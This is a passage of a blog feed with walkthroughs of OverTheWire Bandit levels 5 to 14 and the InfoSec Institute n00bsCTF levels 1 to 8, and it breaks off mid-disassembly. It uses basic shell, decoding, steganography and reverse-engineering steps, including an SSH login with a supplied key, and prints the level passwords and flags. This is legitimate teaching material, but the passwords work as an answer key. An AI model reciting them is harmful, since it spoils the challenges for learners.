&lt;p&gt;&lt;a class="reference external" href="http://overthewire.org/wargames/bandit/bandit6.html"&gt;level 05&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This is similar to the previous level, except now we are looking for something
with a specific size. Luckily the &lt;code&gt;find&lt;/code&gt; command is just right for this:&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;bandit5&amp;#64;melinda:~$&lt;/span&gt; find ./ -size 1033c
&lt;span class="go"&gt;./inhere/maybehere07/.file2
&lt;/span&gt;&lt;span class="gp"&gt;bandit5&amp;#64;melinda:~$&lt;/span&gt; file ./inhere/maybehere07/.file2
&lt;span class="go"&gt;./inhere/maybehere07/.file2: ASCII text, with very long lines
&lt;/span&gt;&lt;span class="gp"&gt;bandit5&amp;#64;melinda:~$&lt;/span&gt; cat !$
&lt;span class="go"&gt;cat ./inhere/maybehere07/.file2
DXjZPULLxYr17uwoI01bNLQbtFemEgo7&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="level-6-7"&gt;
&lt;h2&gt;Level 6 -&amp;gt; 7&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://overthewire.org/wargames/bandit/bandit7.html"&gt;level 06&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Now we need to broaden our search. Once again &lt;code&gt;find&lt;/code&gt; to the rescue. We know
the user and group that own the file and its size. The user and group might
be enough already, so let's give that a go&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;bandit6&amp;#64;melinda:~$&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; /
&lt;span class="gp"&gt;bandit6&amp;#64;melinda:/$&lt;/span&gt; find -user bandit7 -group bandit6  2&amp;gt; /dev/null
&lt;span class="go"&gt;./var/lib/dpkg/info/bandit7.password
&lt;/span&gt;&lt;span class="gp"&gt;bandit6&amp;#64;melinda:/$&lt;/span&gt; cat ./var/lib/dpkg/info/bandit7.password
&lt;span class="go"&gt;HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Perfect. I piped the &lt;code&gt;stderr&lt;/code&gt; to &lt;code&gt;/dev/null&lt;/code&gt; so it doesn't clutter the output
with files that it can't read.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-7-8"&gt;
&lt;h2&gt;Level 7 -&amp;gt; 8&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://overthewire.org/wargames/bandit/bandit8.html"&gt;Level 07&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;To find things in a file, &lt;code&gt;grep&lt;/code&gt; is usually the answer. However it's probably
wise to check the file format first in case all the words are smushed together
and we need to filter grep again.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;bandit7&amp;#64;melinda:~$&lt;/span&gt; head data.txt
&lt;span class="go"&gt;Kunming's       0D0KZ3TdLRBXD8lyd7Bj2hAqnxaMInQe
multitude's     8MFZa8yOjTt6m8PvxteTp7XTDFLiuFAk
audibility      ZeLj0yAw7ylmEoLxSUEqF4iB43c9DN4h
unadvised       Pgp8X2LSVdNrmIKcJ7Oe8eqTzEVfhGbR
Brecht's        uKyKryNUZYFuTQpwRlDqucLLIUbiIMF0
Alvin   IpQIV6mpjticdB790obqXAvYkAgnDV8E
insufficient    cgHhWVJahfDqFIe82vOliryQQ8ihGlGN
Sauterne        UhPBp0A04GkIRfvZnUt1UdwlKU2ViYUd
cluster 1GeFZ0B6rsEtJ5Sqb5h8Wv7UwG15DQzb
ember's f2XPIE1iDHW9oHPyodPyfTz87DAbWmXu
&lt;/span&gt;&lt;span class="gp"&gt;bandit7&amp;#64;melinda:~$&lt;/span&gt; grep millionth data.txt
&lt;span class="go"&gt;millionth       cvX2JJa4CFALtqS87jk27qwqGhBM9plV&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Luckily it was one word and password per line, so grepping the file worked
fine.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-8-9"&gt;
&lt;h2&gt;Level 8 -&amp;gt; 9&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://overthewire.org/wargames/bandit/bandit9.html"&gt;level 08&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;So the only way we know which entry is the password is that it occurs
only once. For this the linux tool &lt;code&gt;uniq&lt;/code&gt; seems perfect. However it can
only detect duplicate lines if they are next to each other. To fix this
we also need to sort the contents of the file and then display only
unique lines:&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;bandit8&amp;#64;melinda:~$&lt;/span&gt; cat data.txt &lt;span class="p"&gt;|&lt;/span&gt; sort &lt;span class="p"&gt;|&lt;/span&gt; uniq -u
&lt;span class="go"&gt;UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="level-9-10"&gt;
&lt;h2&gt;Level 9 -&amp;gt; 10&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://overthewire.org/wargames/bandit/bandit10.html"&gt;Level 09&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This &lt;code&gt;data.txt&lt;/code&gt; file is in binary. So in order to find the strings we need
to dump it as hex, or, even simpler, run it through &lt;code&gt;strings&lt;/code&gt;:&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;bandit9&amp;#64;melinda:~$&lt;/span&gt; strings data.txt  &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;grep&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt;
&lt;span class="go"&gt;I========== the6
========== password
========== ism
========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="level-10-11"&gt;
&lt;h2&gt;Level 10 -&amp;gt; 11&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://overthewire.org/wargames/bandit/bandit11.html"&gt;Level 10&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Good ol base64. If you haven't seen it before, you'll get to see it a lot
more if you carry on doing these kind of challenges. Simply done though:&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;bandit10&amp;#64;melinda:~$&lt;/span&gt; cat data.txt  &lt;span class="p"&gt;|&lt;/span&gt; base64 -d
&lt;span class="go"&gt;The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="level-11-12"&gt;
&lt;h2&gt;Level 11 -&amp;gt; 12&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://overthewire.org/wargames/bandit/bandit12.html"&gt;level 11&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The description is a basically a verbose way of saying that the string
has been encoded with rot13. The quickest way for me to un-rotate it, is
using python:&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;bandit11&amp;#64;melinda:~$&lt;/span&gt; cat data.txt
&lt;span class="go"&gt;Gur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh
&lt;/span&gt;&lt;span class="gp"&gt;bandit11&amp;#64;melinda:~$&lt;/span&gt; python -c &lt;span class="s1"&gt;'import codecs;print codecs.decode(&amp;quot;5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh&amp;quot;, &amp;quot;rot13&amp;quot;)'&lt;/span&gt;
&lt;span class="go"&gt;5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="level-12-13"&gt;
&lt;h2&gt;Level 12 -&amp;gt; 13&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://overthewire.org/wargames/bandit/bandit13.html"&gt;Level 12&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;From here on it's going to get a little trickier. We know that data.txt is a hexdump
of a binary, so first let's convert it back to a binary first with &lt;code&gt;xxd&lt;/code&gt;&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;bandit12&amp;#64;melinda:/tmp/unl$&lt;/span&gt; cat data.txt &lt;span class="p"&gt;|&lt;/span&gt; xxd -r &amp;gt; data2
&lt;/pre&gt;
&lt;p&gt;Then we can find out the filetype of data2&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;bandit12&amp;#64;melinda:/tmp/unl$&lt;/span&gt; file data2
&lt;span class="go"&gt;data2: gzip compressed data, was &amp;quot;data2.bin&amp;quot;, from Unix, last modified: Fri Nov 14 10:32:20 2014, max compression&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;gzip&lt;/code&gt; it is. So uncompress that to data3&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;bandit12&amp;#64;melinda:/tmp/unl$&lt;/span&gt; cat data2 &lt;span class="p"&gt;|&lt;/span&gt; zcat &amp;gt; data3
&lt;/pre&gt;
&lt;p&gt;and get its filetype next. I won't go over each step in detail as there's quite
a few iterations. I'll post the console log of how I got to the flag and hopefully
that should be clear enough.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;bandit12&amp;#64;melinda:/tmp/unl$&lt;/span&gt; file data3
&lt;span class="go"&gt;data3: bzip2 compressed data, block size = 900k
&lt;/span&gt;&lt;span class="gp"&gt;bandit12&amp;#64;melinda:/tmp/unl$&lt;/span&gt; bzcat data3 &amp;gt; data4
&lt;span class="gp"&gt;bandit12&amp;#64;melinda:/tmp/unl$&lt;/span&gt; file data4
&lt;span class="go"&gt;data4: gzip compressed data, was &amp;quot;data4.bin&amp;quot;, from Unix, last modified: Fri Nov 14 10:32:20 2014, max compression
&lt;/span&gt;&lt;span class="gp"&gt;bandit12&amp;#64;melinda:/tmp/unl$&lt;/span&gt; cat data4 &lt;span class="p"&gt;|&lt;/span&gt; zcat &amp;gt; data5
&lt;span class="gp"&gt;bandit12&amp;#64;melinda:/tmp/unl$&lt;/span&gt; file data5
&lt;span class="go"&gt;data5: POSIX tar archive (GNU)
&lt;/span&gt;&lt;span class="gp"&gt;bandit12&amp;#64;melinda:/tmp/unl$&lt;/span&gt; tar xf data5
&lt;span class="gp"&gt;bandit12&amp;#64;melinda:/tmp/unl$&lt;/span&gt; ls
&lt;span class="go"&gt;data.txt  data2  data2.bin  data3  data4  data5  data5.bin
&lt;/span&gt;&lt;span class="gp"&gt;bandit12&amp;#64;melinda:/tmp/unl$&lt;/span&gt; file data5.bin
&lt;span class="go"&gt;data5.bin: POSIX tar archive (GNU)
&lt;/span&gt;&lt;span class="gp"&gt;bandit12&amp;#64;melinda:/tmp/unl$&lt;/span&gt; tar xf data5.bin
&lt;span class="gp"&gt;bandit12&amp;#64;melinda:/tmp/unl$&lt;/span&gt; ls
&lt;span class="go"&gt;data.txt  data2  data2.bin  data3  data4  data5  data5.bin  data6.bin
&lt;/span&gt;&lt;span class="gp"&gt;bandit12&amp;#64;melinda:/tmp/unl$&lt;/span&gt; file data6.bin
&lt;span class="go"&gt;data6.bin: bzip2 compressed data, block size = 900k
&lt;/span&gt;&lt;span class="gp"&gt;bandit12&amp;#64;melinda:/tmp/unl$&lt;/span&gt; bzcat data6.bin &amp;gt; data7
&lt;span class="gp"&gt;bandit12&amp;#64;melinda:/tmp/unl$&lt;/span&gt; file data7
&lt;span class="go"&gt;data7: POSIX tar archive (GNU)
&lt;/span&gt;&lt;span class="gp"&gt;bandit12&amp;#64;melinda:/tmp/unl$&lt;/span&gt; tar xf data7
&lt;span class="gp"&gt;bandit12&amp;#64;melinda:/tmp/unl$&lt;/span&gt; ls
&lt;span class="go"&gt;data.txt  data2  data2.bin  data3  data4  data5  data5.bin  data6.bin  data7  data8.bin
&lt;/span&gt;&lt;span class="gp"&gt;bandit12&amp;#64;melinda:/tmp/unl$&lt;/span&gt; file data8.bin
&lt;span class="go"&gt;data8.bin: gzip compressed data, was &amp;quot;data9.bin&amp;quot;, from Unix, last modified: Fri Nov 14 10:32:20 2014, max compression
&lt;/span&gt;&lt;span class="gp"&gt;bandit12&amp;#64;melinda:/tmp/unl$&lt;/span&gt; cat data8.bin &lt;span class="p"&gt;|&lt;/span&gt; zcat &amp;gt; data9
&lt;span class="gp"&gt;bandit12&amp;#64;melinda:/tmp/unl$&lt;/span&gt; file data9
&lt;span class="go"&gt;data9: ASCII text
&lt;/span&gt;&lt;span class="gp"&gt;bandit12&amp;#64;melinda:/tmp/unl$&lt;/span&gt; cat data9
&lt;span class="go"&gt;The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Basically we identify, extract, repeat, until we're at the plain text file with the
password.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-13-14"&gt;
&lt;h2&gt;Level 13 -&amp;gt; 14&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://overthewire.org/wargames/bandit/bandit14.html"&gt;Level 13&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;We're given a lot of information here, and one of those is that we get the SSH
key for the &lt;code&gt;bandit14&lt;/code&gt; user. We can use this to login as that user without knowing
the password:&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;bandit13&amp;#64;melinda:~$&lt;/span&gt; ssh -i ./sshkey.private bandit14&amp;#64;localhost
&lt;span class="go"&gt;Could not create directory '/home/bandit13/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is 05:3a:1c:25:35:0a:ed:2f:cd:87:1c:f6:fe:69:e4:f6.
Are you sure you want to continue connecting (yes/no)? yes
.
.
&lt;/span&gt;&lt;span class="gp"&gt;bandit14&amp;#64;melinda:~$&lt;/span&gt; cat /etc/bandit_pass/bandit14
&lt;span class="go"&gt;4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;We pass the key as an argument to the ssh command, and connect to the localhost
as bandit14. Then we can read the file with the password.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-14-15"&gt;
&lt;h2&gt;Level 14 -&amp;gt; 15&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://overthewire.org/wargames/bandit/bandit15.html"&gt;Level 14&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This level starts introducing some networking and how to interact with remote
hosts. Well, in this case it's localhost, but the principle is the same.
We need to connect to a specific port on localhost and then supply
the current password. I'm using &lt;code&gt;netcat&lt;/code&gt; to do this&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;bandit14&amp;#64;melinda:~$&lt;/span&gt; nc localhost 30000
&lt;span class="go"&gt;4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
Correct!
BfMYroe26WYalil77FoDi9qh59eK5xNr&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;All you get is a blank line when you've connected. The simply paste in the
password you logged in with and hit enter.&lt;/p&gt;
&lt;p&gt;Continues with &lt;a class="reference external" href="http://unlogic.co.uk/2015/03/13/lets-crack-bandit-part2"&gt;Let's crack Bandit Part 2&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;
</summary></entry><entry><title>Solving Infosec n00bsCTF</title><link href="http://unlogic.co.uk/2015/03/11/solving-infosec-n00bsctf/" rel="alternate"></link><updated>2015-03-13T21:00:00+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2015-03-11:2015/03/11/solving-infosec-n00bsctf/</id><summary type="html">&lt;p&gt;The InfoSec Institue is running a &lt;a class="reference external" href="http://ctf.infosecinstitute.com/index.php"&gt;n00bsCTF&lt;/a&gt;,
and I can't resist a CTF really. Plus this will be a nice warmup for Hackyeaster 2015.
So let's jump on it and get some flags...&lt;/p&gt;
&lt;p&gt;I haven't managed to get all of them, but I will be updating this post when
I manage to solve some of the others.&lt;/p&gt;
&lt;div class="section" id="level-01"&gt;
&lt;h2&gt;Level 01&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://ctf.infosecinstitute.com/levelone.php"&gt;http://ctf.infosecinstitute.com/levelone.php&lt;/a&gt;&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/ebnLRwp.png" /&gt;
&lt;p&gt;May the source be with you, eh? Sounds to me like someone wants us to look at the
page source. Right click, select :code:&lt;tt class="docutils literal"&gt;view page source&lt;/tt&gt; and...&lt;/p&gt;
&lt;pre class="code html literal-block"&gt;
&lt;span class="c"&gt;&amp;lt;!-- infosec_flagis_welcome --&amp;gt;&lt;/span&gt;
&lt;span class="cp"&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt; &lt;span class="na"&gt;lang&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
  &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;head&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;And there it is, right at the top.&lt;/p&gt;
&lt;blockquote&gt;
infosec_flagis_welcome&lt;/blockquote&gt;
&lt;/div&gt;
&lt;div class="section" id="level-02"&gt;
&lt;h2&gt;Level 02&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://ctf.infosecinstitute.com/leveltwo.php"&gt;http://ctf.infosecinstitute.com/leveltwo.php&lt;/a&gt;&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/TVGZFKU.png" /&gt;
&lt;p&gt;A broken image you say? Let's download it and have a look. We notice it's very small,
only 45 bytes. So let's open it in a hex editor and examine its contents. I opened
it in vim (to use it as a hex editor enter :code:&lt;tt class="docutils literal"&gt;:!xxd&lt;/tt&gt;),
and was instantly greeted with this string. Didn't even have to convert it to hex.&lt;/p&gt;
&lt;blockquote&gt;
aW5mb3NlY19mbGFnaXNfd2VhcmVqdXN0c3RhcnRpbmc=&lt;/blockquote&gt;
&lt;p&gt;Base64 encoded text. Let's run it through a decoder and see what we get....&lt;/p&gt;
&lt;blockquote&gt;
infosec_flagis_wearejuststarting&lt;/blockquote&gt;
&lt;p&gt;Level02's flag done.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-03"&gt;
&lt;h2&gt;Level 03&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://ctf.infosecinstitute.com/levelthree.php"&gt;http://ctf.infosecinstitute.com/levelthree.php&lt;/a&gt;&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/lL8OkTO.png" /&gt;
&lt;p&gt;We are presented with a QR code. So I grabbed my phone, scanned it, and was presented
with a series of dots and dashes. Morse code no doubt. Being lazy I didn't want to type
it into a decoder manually,
so I used &lt;a class="reference external" href="http://zxing.org/w/decode.jspx"&gt;this tool&lt;/a&gt; to decode the QR code
and then copy/pasted the output into a &lt;a class="reference external" href="http://www.onlineconversion.com/morse_code.htm"&gt;morse code translator&lt;/a&gt;
and ended up with:&lt;/p&gt;
&lt;blockquote&gt;
INFOSECFLAGISMORSING&lt;/blockquote&gt;
&lt;/div&gt;
&lt;div class="section" id="level-04"&gt;
&lt;h2&gt;Level 04&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://ctf.infosecinstitute.com/levelfour.php"&gt;http://ctf.infosecinstitute.com/levelfour.php&lt;/a&gt;&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/yFiSrus.png" /&gt;
&lt;p&gt;A picture and a tidbit of information. Hrmm... Ok, not much to go with here. Mousing
over the image pops up a dialog. Investigating that didn't lead me anywhere. Time
to get the thinking hats on and think about what info we have here that might be
relevant. Because everything we need to solve this level is somewhere here.
Of course the biggest clue is the picture: Cookie Monster. Right, let's check the cookie
cache. Only one cookie by infosecinstitute. It's garbage! Or is it perhaps just a
caesar cipher? Each letter is shifted by a certain amount, and we need to figure out
that amount. Due to the number of characters and _ in the string, it looks like it.&lt;/p&gt;
&lt;p&gt;Knowing the format of previous flags we can figure out how much to shift by.&lt;/p&gt;
&lt;p&gt;So &lt;code&gt;vasbfrp_syntvf_jrybirpbbxvrf&lt;/code&gt; should be &lt;code&gt;infosec_flag_xxxxxxx&lt;/code&gt;. Knowing this
we can work out the shift. Simple write out the alphabet once and
then, write the letters we know below.&lt;/p&gt;
&lt;blockquote&gt;
abcdefghijklmnopqrstuvwxyz
n                 f   i&lt;/blockquote&gt;
&lt;p&gt;That's enough for us to fill in the rest of the alphabet.
Then transpose and solve the final part to get:&lt;/p&gt;
&lt;blockquote&gt;
infosec_flag_welovecookies&lt;/blockquote&gt;
&lt;p&gt;Flag has been nommed.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-05"&gt;
&lt;h2&gt;Level 05&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://ctf.infosecinstitute.com/levelfive.php"&gt;http://ctf.infosecinstitute.com/levelfive.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;A pesky popup saying I'm a hacker? What an accusation. Well, let's top it from
popping up and get ourselves a script blocker to see what else there might be.
Once done, we examine the source and see it's loading an image too.&lt;/p&gt;
&lt;pre class="code html literal-block"&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;img&lt;/span&gt; &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;img/aliens.jpg&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;/&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;br&lt;/span&gt; &lt;span class="p"&gt;/&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;br&lt;/span&gt; &lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;img alt="" src="http://i.imgur.com/JwFtmSw.png" /&gt;
&lt;p&gt;Let's load up that image, or even better, let's just browse to &lt;code&gt;http://ctf.infosecinstitute.com/img/&lt;/code&gt;
(Since writing directory listing has been disabled for this path).
Nothing particularily odd about the image. Let's try seeing if there's anything hidden in
it by way of steganography. I loaded up the image into &lt;a class="reference external" href="http://www.futureboy.us/stegano/decinput.html"&gt;this site&lt;/a&gt;
and sure enough, selecting a type of &lt;code&gt;text/plain&lt;/code&gt; we get a stream of 1s and 0s. Binary data.
Let's try to convert that to a string and see what, if anything, it says. Using any
binary to text decoder on the internet, we are given the flag:&lt;/p&gt;
&lt;blockquote&gt;
infosec_flagis_stegaliens&lt;/blockquote&gt;
&lt;p&gt;Gotcha&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-06"&gt;
&lt;h2&gt;Level 06&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://ctf.infosecinstitute.com/levelsix.php"&gt;http://ctf.infosecinstitute.com/levelsix.php&lt;/a&gt;&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/w81ZV0N.png" /&gt;
&lt;p&gt;At first I was a bit lost, but when you stare at a lot of data, it's easy to be overwhelmed.
Especially when you don't know really what you are looking for. I decided to give it another go
and have located the flag. It's actually in the very first packet. The hex string for &lt;em&gt;infosec_flag&lt;/em&gt;
is starting to look very familiar now. It appears as the data of the first packet:&lt;/p&gt;
&lt;a class="reference external image-reference" href="http://i.imgur.com/aO8ojXG.png"&gt;&lt;img alt="" src="http://i.imgur.com/aO8ojXG.png" style="width: 500px;" /&gt;&lt;/a&gt;
&lt;p&gt;Enter the string with :code:&lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;696e66...&lt;/span&gt;&lt;/tt&gt; into a hex to string converter and you get&lt;/p&gt;
&lt;blockquote&gt;
infosec_flagis_sniffed&lt;/blockquote&gt;
&lt;p&gt;Sniffed right out.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-07"&gt;
&lt;h2&gt;Level 07&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://ctf.infosecinstitute.com/404.php"&gt;http://ctf.infosecinstitute.com/404.php&lt;/a&gt;&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/PZu5CIK.png" /&gt;
&lt;p&gt;We get an error saying &lt;em&gt;f00 not found&lt;/em&gt; and the URL reads 404.php. Going by the other URLs
I would assume we actually need :code:&lt;tt class="docutils literal"&gt;levelseven.php&lt;/tt&gt;, so let's enter that and see what we get.
It seems to return an empty page. That's not much use, but it's better than a real
404. Because there's no error and no content, we must be getting back a 200 status (all OK).
Perhaps there's something else to look at too?&lt;/p&gt;
&lt;p&gt;In this case let's examine what's going back and forth between us and the server.
You can either fire up a proxy like &lt;a class="reference external" href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project"&gt;ZAP&lt;/a&gt;
or use a request inspection plugin for Firefox like &lt;a class="reference external" href="https://addons.mozilla.org/en-US/firefox/addon/httprequester/"&gt;httpRequester&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;So let's send off a GET request for :code:&lt;tt class="docutils literal"&gt;levelseven.php&lt;/tt&gt; and see what we get back.&lt;/p&gt;
&lt;pre class="code html literal-block"&gt;
HTTP/1.0 200 aW5mb3NlY19mbGFnaXNfeW91Zm91bmRpdA==
Date: Thu, 12 Mar 2015 09:26:48 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.6
Content-Length: 0
Connection: close
Content-Type: text/html
&lt;/pre&gt;
&lt;p&gt;Heh, very nice. We have a 200 response with, what is clearly a base64 encoded string.
Copypasta that into a decoder and let's see what we get:&lt;/p&gt;
&lt;blockquote&gt;
infosec_flagis_youfoundit&lt;/blockquote&gt;
&lt;p&gt;Yes, I did find it.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-08"&gt;
&lt;h2&gt;Level 08&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://ctf.infosecinstitute.com/leveleight.php"&gt;http://ctf.infosecinstitute.com/leveleight.php&lt;/a&gt;&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/OSKPz0g.png" /&gt;
&lt;p&gt;Ok, let's download :code:&lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;app.exe`:code:`&lt;/span&gt; and give this a go. It's a wrapper around &lt;span class="pre"&gt;`:code:`netstat&lt;/span&gt;&lt;/tt&gt; that
just shows you what your current connections are. It takes no arguments, so there's
not anyway to attack this thing with overflows. And this being a n00bs level CTF, it's
unlikely we'll be thrown this kind of exploit development.
So the other thing we can do is check its strings.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="go"&gt;strings app.exe&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Sure enough, there's :code:&lt;tt class="docutils literal"&gt;infosec_flagis_0x1a&lt;/tt&gt;. At first I was reluctant to go with this, as
it's a bit too simple, so I looked a bit further. I dumped the source with :code:&lt;tt class="docutils literal"&gt;objdump&lt;/tt&gt;&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="go"&gt;objdump -s app.exe | less&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;And I found :code:&lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;infosec_flagis_0x1a`:code:`&lt;/span&gt; in it. It sits at &lt;span class="pre"&gt;`:code:`0x403000&lt;/span&gt;&lt;/tt&gt;, so let's run this
through :code:&lt;tt class="docutils literal"&gt;gdb&lt;/tt&gt; too.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;&amp;gt; gdb app.exe
&lt;span class="go"&gt;gdb$ disass main
Dump of assembler code for function main:
   0x00401290 &amp;lt;+0&amp;gt;:     push   %ebp
   0x00401291 &amp;lt;+1&amp;gt;:     mov    %esp,%ebp
   0x00401293 &amp;lt;+3&amp;gt;:     sub    $0x18,%esp
   0x00401296 &amp;lt;+6&amp;gt;:     and    $0xfffffff0,%esp
   0x00401299 &amp;lt;+9&amp;gt;:     mov    $0x0,%eax
   0x0040129e &amp;lt;+14&amp;gt;:    add    $0xf,%eax
   0x004012a1 &amp;lt;+17&amp;gt;:    add    $0xf,%eax
   0x004012a4 &amp;lt;+20&amp;gt;:    shr    $0x4,%eax
   0x004012a7 &amp;lt;+23&amp;gt;:    shl    $0x4,%eax
   0x004012aa &amp;lt;+26&amp;gt;:    mov    %eax,-0x8(%ebp)
   0x004012ad &amp;lt;+29&amp;gt;:    mov    -0x8(%ebp),%eax
   0x004012b0 &amp;lt;+32&amp;gt;:    call   0x401740 &amp;lt;_alloca&amp;gt;
   0x004012b5 &amp;lt;+37&amp;gt;:    call   0x4013e0 &amp;lt;__main&amp;gt;
   0x004012ba &amp;lt;+42&amp;gt;:    mov    $0x403000,%eax       &amp;lt;------ aha oho
   0x004012bf &amp;lt;+47&amp;gt;:    mov    %al,-0x1(%ebp)
   0x004012c2 &amp;lt;+50&amp;gt;:    movl   $0x403014,(%esp)
   0x004012c9 &amp;lt;+57&amp;gt;:    call   0x401850 &amp;lt;printf&amp;gt;
   0x004012ce &amp;lt;+62&amp;gt;:    movl   $0x403044,(%esp)
